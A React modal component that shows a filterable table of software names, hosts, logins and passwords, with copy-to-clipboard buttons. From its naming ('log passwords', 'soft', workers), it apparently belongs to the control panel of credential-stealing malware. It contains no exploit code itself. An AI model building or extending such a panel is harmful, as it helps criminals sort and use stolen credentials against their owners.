import React, { useState } from 'react';

import languagesTranslate from '../../common/languages'

export default ({
  CurrentLanguage_G,
  staticMarks,
  passwords,
  onOutsideClick
}) => {
  const [Search, changeSearch] = useState('');
  const [Mark, changeMark] = useState('');
  const [Soft, changeSoft] = useState('');
  const [Passwords, changePasswords] = useState(passwords);

  return (

    <div onClick={e => e.target.id == 'defaultModal' ? onOutsideClick() : null} class={"modal fade  overflow-auto show"} id="defaultModal" tabindex="-1" role="dialog" style={{ display: 'inline-block' }}>
      <div class="modal-dialog modal-lgt" role="document">
        <div class="modal-content">
          <div class="modal-header">
            <button onClick={onOutsideClick} type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times; </span></button>
            <h4 class="title" id="defaultModalLabel">{languagesTranslate[CurrentLanguage_G].showLogPasswords.passwords}</h4>
          </div>
          <div class="modal-body">
            <div className="w-100 mb-3">
              {
                [...new Set(Passwords.map(v => v.soft))].map((v, i) => v
                  ? <button key={i} onClick={() => Soft == v ? changeSoft('') : changeSoft(v)} class={Soft == v ? "btn btn-info" : "btn btn-primary"}>{v}({Passwords.filter(pv => pv.soft == v).length})</button>
                  : null
                )
              }
            </div>
            <div className="w-100 row">
              <div className="col-12">
                {
                  staticMarks.map((v, i) =>
                    <span key={i} onClick={() => Mark == v ? changeMark('') : changeMark(v)} className={Mark == v ? 'cursor-pointer bg-info p-2 rounded' : 'cursor-pointer bg-secondary p-2 rounded'}>{v}</span>
                  )
                }
              </div>
              <div className="col-6" />
              <div className="col-6">
                <div class="form-group">
                  <input type="text" class="form-control" placeholder={languagesTranslate[CurrentLanguage_G].showLogPasswords.search} value={Search} onChange={e => changeSearch(e.target.value)} />
                </div>
              </div>
            </div>
            <table class="table table-bordered">
              <thead>
                <tr>
                  <th>{languagesTranslate[CurrentLanguage_G].showLogPasswords.soft}</th>
                  <th>{languagesTranslate[CurrentLanguage_G].showLogPasswords.domain}</th>
                  <th>{languagesTranslate[CurrentLanguage_G].showLogPasswords.login}</th>
                  <th>{languagesTranslate[CurrentLanguage_G].showLogPasswords.password}</th>
                </tr>
              </thead>
              <tbody>
                {
                  Passwords
                    .filter(v => v.soft.indexOf(Soft) != -1)
                    .filter(v => v.host.indexOf(Mark) != -1)
                    .filter(v => v.host.indexOf(Search) != -1 || v.login.indexOf(Search) != -1 || v.password.indexOf(Search) != -1).map((v, i) =>
                      <tr key={i}>
                        <th scope="row">{v.soft}</th>
                        <th style={{ maxWidth: '250px', wordWrap: 'break-word' }}>{v.host}<i onClick={() => navigator.clipboard.writeText(v.host)} class="cursor-pointer ml-2 zmdi zmdi-copy"></i></th>
                        <th>{v.login}<i onClick={() => navigator.clipboard.writeText(v.login)} class="cursor-pointer ml-2 zmdi zmdi-copy"></i></th>
                        <th>{v.password}<i onClick={() => navigator.clipboard.writeText(v.password)} class="cursor-pointer ml-2 zmdi zmdi-copy"></i></th>
                      </tr>
                    )
                }
              </tbody>
            </table>
          </div>
          <div class="modal-footer">
            <button onClick={onOutsideClick} type="button" class="btn btn-danger waves-effect" data-dismiss="modal">{languagesTranslate[CurrentLanguage_G].addWorkerComponent.closeButton}</button>
          </div>
        </div>
      </div>
    </div>

  )

}
